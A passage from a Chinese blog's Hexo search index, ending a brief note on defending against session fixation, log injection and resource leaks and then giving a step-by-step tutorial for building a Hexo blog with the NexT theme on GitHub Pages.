id是否相同 防范 在用户登陆成功后重新创建一个session id 登陆前的匿名会话强制失效 session id与浏览器绑定 session id与所访问的浏览器有变化，就立即重置 session id与所访问的IP绑定 session id与所访问的IP有变化，就立即重置 日志攻击 概念将未经验证的用户输入写入日志文件，致使攻击者伪造日志条目或将恶意信息内容注入日志 防范 只输出必要的日志，功能上线前删除大多数调试日志 过滤非法字符 资源泄露 概念程序可能无法成功释放某一项已申请的系统资源 如果攻击者能够故意触发资源泄露，就有可能通过耗尽资源池的方式发起DOS攻击 分类流资源未释放(Unrelease Stream)数据库连接未释放(Unrelease DB Connection)防范 关闭连接时，使用try/catch处理异常 使用工具类关闭 工具类： import org.apache.commons.io.IOUtils JAVA代码：IOUtils.closeQuietly(br)]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo+github+next博客搭建]]></title>
    <url>%2F2018%2F07%2F28%2Fhexo-github-next%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境win10专业版，64位 准备工作 注册github账号 下载安装git for windows,我用的是Git-2.18.0-64-bit 一路next就好 验证安装：任何位置鼠标右击出现Git Bash Here cmd下 1git --version 下载安装node.js,我用的是node-v10.7.0-x64 验证安装：cmd下 1node -v npm会默认安装 创建仓库在github上新建仓库New repository 注意，仓库命名格式必须是 yourname.github.io （yourname是你的github用户名）这就是以后访问的博客网址 注册的邮箱一定要验证，否则不会成功 仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟 配置SSH key用于本地与github数据交换 生成并配置key 执行如下命令 12git config --global user.name &quot;xxx&quot; #你的github用户名git config --global user.email &quot;xxx@qq.com&quot; #填写你的github注册邮箱 生成ssh密钥 12cd ~/. ssh #检查本机已存在的ssh密钥ssh-keygen -t rsa -C &quot;邮件地址&quot; #生成密钥 连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容 打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可 测试ssh本地执行 1ssh -T git@github.com #注意邮箱地址不用改 如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 使用Hexo以下所有命令建议在git bash下运行 安装1npm install hexo-cli -g 验证安装 1hexo -v 初始化在本地主机上建立一个hexo文件夹，用于日后代码，博客的存放 进入此目录 1hexo init 此目录会自动生成hexo相关文件 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件 本地预览hexo目录中执行 12hexo g #生成静态页面hexo s #启动本地预览服务 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github 浏览器访问http://127.0.0.1:4000，即可看到hexo默认生成页面hello,world 写博客进入hexo根目录 1hexo new &apos;my-first-blog&apos; ‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source\_posts\目录下生成.md文件， 只要打开这个文件就可以写博客了 上传到github上传前的配置配置站点配置文件_config.yml中的deploy部分： 1234deploy: type: git repository: git@github.com:yourname/yourname.github.io.git branch: master 安装上传插件 1npm install hexo-deployer-git --save 上传文件在hexo根目录下 1hexo d 会将有所改动的内容全部提交至github 常用hexo命令123456789101112131415161718hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help #查看帮助hexo version #查看Hexo的版本hexo clean #清除缓存缩写：hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy组合命令：hexo s -g #生成并本地预览hexo d -g #生成并上传 更改默认hexo主题及优化hexo与next目录结构hexo目录结构 deploy：执行hexo deploy命令部署到GitHub上的内容目录 public：执行hexo generate命令，输出的静态网页内容目录 scaffolds：layout模板文件目录，其中的md文件可以添加编辑 scripts：扩展脚本目录，这里可以自定义一些javascript脚本 source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。 drafts：草稿文章 posts：发布文章 themes：主题文件目录 _config.yml：全局配置文件，大多数的设置都在这里 package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮 next主题目录结构 主题下载进入hexo根目录 执行 1git clone https://github.com/iissnan/hexo-theme-next themes/next 执行完成后会在hexo\themes\目录下生成next目录 next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件 主题应用配置站点配置文件 寻找theme字段，将其值修改为next（next前后都有一个空格，否则会报错） 主题预览执行 123hexo clean #清除缓存hexo g #重新生成代码hexo s #部署到本地 浏览器访问http://127.0.0.1:4000查看效果 主题简单优化设置布局主题配置文件中 寻找Scheme字段，next提供三种默认主题布局，将你想使用的布局取消注释即可 123#scheme: Muse#scheme: Mistscheme: Pisces Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 设置显示语言站点配置文件中 寻找language 字段，设置其值为 1language: zh-CN 语言文件位于hexo\themes\next\languages目录下 设置菜单主题配置文件中 寻找menu字段 1234567menu: home: / #主页 archives: /archives #归档页 #about: /about #关于页 #categories: /categories #分类页 tags: /tags #标签页 #commonweal: /404.html #公益404 除主页与归档页外，其余页面需要手动创建 每行中||后的内容为指定此menu的图标 添加标签页新建页面进入hexo根目录 1hexo new page tags 命令执行后，hexo\source\tags目录中生成index.md文件 设置页面类型修改此index.md文件为(添加type行) 12345---title: tagsdate: 2016-11-15 19:10:05type: &quot;tags&quot;--- 设置具体博客文章tags对于hexo\source\_post目录下具体博客文章设置tags(设置tags行) 12345---title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github]--- 添加分类页面新建页面进入hexo根目录 1hexo new page categories 命令执行后，hexo\source\categories目录中生成index.md文件 设置页面类型修改此index.md文件为(添加categories行) 12345---title: categoriesdate: 2016-11-15 19:11:13type: &quot;categories&quot;--- 设置具体博客文章categories对于hexo\source\_post目录下具体博客文章设置categories(设置categories行) 123456---title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github]categories: 搭建博客--- 添加关于页面添加页面进入hexo根目录 1hexo new page about 命令执行后，hexo\source\about目录中生成index.md文件 修改index.md文件1234567891011---title: aboutdate: 2016-11-15 19:08:50---## 关于我一只学习的小菜鸟，欢迎分享知识。QQ：Email: 设置站内搜索进入hexo根目录 1npm install hexo-generator-searchdb --save 站点配置文件中添加 12345search: path: search.xml field: post format: html limit: 10000 hexo 首页文章只显示一部分在博客文章适当位置添加&lt;!--more--&gt; 标记即可 网站底部字数统计进入hexo根目录 1npm install hexo-wordcount --save hexo\themes\next\layout\_partials\footer.swig文件中末尾添加 1234&lt;div class=&quot;theme-info&quot;&gt; &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt; &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;&lt;/div&gt; 修改文章底部的带#号的标签修改hexo\themes\next\layout\_macro\post.swig文件，搜索rel=&quot;tag&quot;&gt;# ，改为&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 在每篇文章末尾统一添加“本文结束”标记在hexo\themes\next\layout\_macro目录下，新建passage-end-tag.swig ，并添加如下内容 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 接着打开hexo\themes\next\layout\_macro\post.swig文件，在post-body 之后添加 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include &apos;passage-end-tag.swig&apos; %&#125; &#123;% endif %&#125;&lt;/div&gt; 打开主题配置文件，在末尾添加 123# 文章末尾添加“本文结束”标记passage_end_tag: enabled: true 主页文章添加阴影效果打开hexo\themes\next\source\css\_custom\custom.styl文件，添加代码 12345678// 主页文章添加阴影效果 .post &#123; margin-top: 0px; margin-bottom: 50px; padding: 50px; -webkit-box-shadow: 0 0 100px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 100px rgba(202, 203, 204, .5); &#125; 设置网站图标在EasyIcon(http://www.easyicon.net/)中找一张（32*32）和一张（16x16）的ico图标,或者去别的网站下载或者制作，并将图标名称改为favicon32x32.ico和favicon16x16.ico，然后把图标放在hexo\themes\next\source\images里，并且修改主题配置文件： 123icon: mall: /images/favicon16x16.icomedium: /images/favicon32x32.ico 实现统计功能进入hexo根目录 1npm install hexo-wordcount --save 主题配置文件中，添加代码 123456# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: true wordcount: true min2read: true 设置侧边栏主题配置文件中 设置侧边栏在左侧或右侧 1234sidebar: # Sidebar Position, available value: left | right (only for Pisces | Gemini). position: left #position: right 设置侧边栏显示时机 post - 默认行为，在文章页面（拥有目录列表）时显示 always - 在所有页面中都显示 hide - 在所有页面中都隐藏（可以手动展开） remove - 完全移除 123456789# Sidebar Display, available value (only for Muse | Mist): # - post expand on posts automatically. Default. # - always expand for all pages automatically # - hide expand only when click on the sidebar toggle icon. # - remove Totally remove sidebar including sidebar toggle. #display: post #display: always display: hide #display: remove 修改``代码块样式打开\themes\next\source\css\_custom\custom.styl,向里面加入 123456789101112131415// Custom styles.code &#123; color: #ff7600; background: #fbf7f8; margin: 2px;&#125;// 大代码块的自定义样式.highlight, pre &#123; margin: 5px 0; padding: 5px; border-radius: 3px;&#125;.highlight, code, pre &#123; border: 1px solid #d6d6d6;&#125; 博客中添加视频可以将视频上传视频网站，添加外链 12345&lt;iframe height=500 width=100% src=&quot;https://xxxxx&quot; frameborder=0 allowfullscreen&gt;&lt;/iframe&gt; 修改博客背景图片 在hexo\themes\next\source\images路径下添加自定义背景图片 修改hexo\themes\next\source\css\_custom路径下custom.styl文件，添加 12345body &#123; background:url(/images/background.jpeg); //设置背景图片路径名称 background-attachment:fixed; //设置背景图片不随页面移动 background-size:cover; &#125; 修改主页文章框过高问题问题如下 如图所示，红框部分无用，且占用太多空间 解决： hexo\themes\next\source\css\_common\components\post路径下的post-eof.styl文件,注释掉此串代码即可 12345678910.posts-expand &#123; // .post-eof &#123; // display: block; // margin: $post-eof-margin-top auto $post-eof-margin-bottom; // width: 8%; // height: 1px; // background: $grey-light; // text-align: center; // &#125;// &#125; 修改博客加载动画/themes/next目录下，打开Git Bash,安装Progress module 1git clone https://github.com/theme-next/theme-next-pace source/lib/pace 安装完成后在/themes/next/source/lib查看会看到pace文件夹 在/themes/next/_config.yml中设置 123456789101112131415161718pace: true #设置为true# Themes list:#pace-theme-big-counter#pace-theme-bounce#pace-theme-barber-shop#pace-theme-center-atom#pace-theme-center-circle#pace-theme-center-radar#pace-theme-center-simple#pace-theme-corner-indicator#pace-theme-fill-left#pace-theme-flash#pace-theme-loading-bar#pace-theme-mac-osx#pace-theme-minimal# For example# pace_theme: pace-theme-center-simplepace_theme: pace-theme-bounce #这里任选其中一种 设置返回顶部按钮显示百分比主题配置文件中 12# Scroll percent label in b2t button. scrollpercent: true # 设置为true即可 增加代码复制功能主题配置文件中 12345# Add copy button on codeblock copy_button: enable: true # 设置为true即可 # Show text copy result show_result: true # 设置为true即可 实现博客中点击图片放大效果 添加插件 进入/hexo/themes/next/source/lib目录中 1git clone https://github.com/theme-next/theme-next-fancybox3 fancybox 编辑主题配置文件 123修改为fancybox: true 访问线上博客执行 123hexo cleanhexo ghexo d 浏览器访问https://yourname.github.io （yourname是你的github用户名） 绑定域名若你觉得github的域名配不上你的王霸之气，那么也可以购买域名进行绑定 国内的话，去阿里云或者腾讯云买个域名就不错，也非常便宜 设置域名解析ping一下你的博客域名，获取其IP地址 在阿里云或腾讯云设置域名解析 123记录类型 主机记录 解析线路 记录值CNAME WWW 默认 github博客域名A @ 默认 github的IP地址 设置github部分进入hexo\source目录，创建CNAME文件（无后缀名），添加你购买且解析的域名（完整域名，但不包含http://） 上传进入hexo目录 123hexo cleanhexo ghexo d 即可使用自定义域名访问博客，并且原博客域名也不会失效 错误首次更新博文,页面404可能原因 仓库名称未按照格式命名 命名格式：yourname.github.io （yourname是你的github用户名） index.html丢失 安装插件 12345678910111213npm install hexo-generator-index --savenpm install hexo-generator-archive --savenpm install hexo-generator-category --savenpm install hexo-generator-tag --savenpm install hexo-server --savenpm install hexo-deployer-git --savenpm install hexo-deployer-heroku --savenpm install hexo-deployer-rsync --savenpm install hexo-deployer-openshift --savenpm install hexo-renderer-marked@0.2 --savenpm install hexo-renderer-stylus@0.2 --savenpm install hexo-generator-feed@1 --savenpm install hexo-generator-sitemap@1 --save 参考连接https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html http://theme-next.iissnan.com/getting-started.html http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html https://www.cnblogs.com/syd192/p/6074323.html https://lruihao.cn/hexo/hexo-%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%EF%BC%8C%E9%9F%B3%E4%B9%90%EF%BC%8C%E9%93%BE%E6%8E%A5%EF%BC%8C%E8%A7%86%E9%A2%91.html http://www.cnblogs.com/mrwuzs/p/7954438.html https://eirunye.github.io/2018/09/15/Hexo%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%E2%80%94%E6%89%93%E9%80%A0%E7%82%AB%E9%85%B7%E7%9A%84NexT%E4%B8%BB%E9%A2%98%E2%80%94%E9%AB%98%E7%BA%A7%E2%80%94%E5%9B%9B/ https://blog.csdn.net/L_Bill/article/details/84785059]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
